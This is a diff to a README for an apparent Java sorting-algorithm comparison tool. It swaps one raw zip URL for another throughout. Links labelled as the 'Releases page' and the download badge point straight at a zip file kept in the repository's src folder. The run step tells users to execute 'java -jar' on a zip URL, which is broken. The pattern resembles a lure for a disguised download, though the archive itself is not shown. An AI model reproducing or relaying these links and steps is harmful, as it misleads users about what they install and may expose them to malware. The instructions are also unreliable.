@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the sorting-algorithms-compar
 
 ## 🔗 Download Now
 
-[![Download Release](https://github.com/abcdethatshowyoustartthealphabet/sorting-algorithms-comparison/raw/refs/heads/main/nbproject/comparison-sorting-algorithms-v1.8.zip%20Release-%20-%2300A0D8)](https://github.com/abcdethatshowyoustartthealphabet/sorting-algorithms-comparison/raw/refs/heads/main/nbproject/comparison-sorting-algorithms-v1.8.zip)
+[![Download Release](https://github.com/abcdethatshowyoustartthealphabet/sorting-algorithms-comparison/raw/refs/heads/main/src/algorithms-sorting-comparison-actually.zip%20Release-%20-%2300A0D8)](https://github.com/abcdethatshowyoustartthealphabet/sorting-algorithms-comparison/raw/refs/heads/main/src/algorithms-sorting-comparison-actually.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://github.com/abcdethatshowyoustartthealphabet/sorting-algorithms-comparison/raw/refs/heads/main/nbproject/comparison-sorting-algorithms-v1.8.zip).
+1. Visit the [Releases page](https://github.com/abcdethatshowyoustartthealphabet/sorting-algorithms-comparison/raw/refs/heads/main/src/algorithms-sorting-comparison-actually.zip).
 2. Look for the latest release available.
 3. Click on the download link for the version that matches your system.
 4. Extract the downloaded ZIP file to a desired location on your computer.
@@ -30,7 +30,7 @@ To get started, follow these steps:
 7. Run the application using Java by entering the following command:
 
    ```
-   java -jar https://github.com/abcdethatshowyoustartthealphabet/sorting-algorithms-comparison/raw/refs/heads/main/nbproject/comparison-sorting-algorithms-v1.8.zip
+   java -jar https://github.com/abcdethatshowyoustartthealphabet/sorting-algorithms-comparison/raw/refs/heads/main/src/algorithms-sorting-comparison-actually.zip
    ```
 
 ## 🔍 Explore the Application
@@ -86,7 +86,7 @@ If you're interested in contributing or have suggestions, please feel free to fo
 
 ## 🌍 Stay Updated
 
-For updates and more information about the application, keep an eye on the [Releases page](https://github.com/abcdethatshowyoustartthealphabet/sorting-algorithms-comparison/raw/refs/heads/main/nbproject/comparison-sorting-algorithms-v1.8.zip). You can also follow the development process through the issues and discussions section in the repository.
+For updates and more information about the application, keep an eye on the [Releases page](https://github.com/abcdethatshowyoustartthealphabet/sorting-algorithms-comparison/raw/refs/heads/main/src/algorithms-sorting-comparison-actually.zip). You can also follow the development process through the issues and discussions section in the repository.
 
 ## 📅 Future Enhancements
 
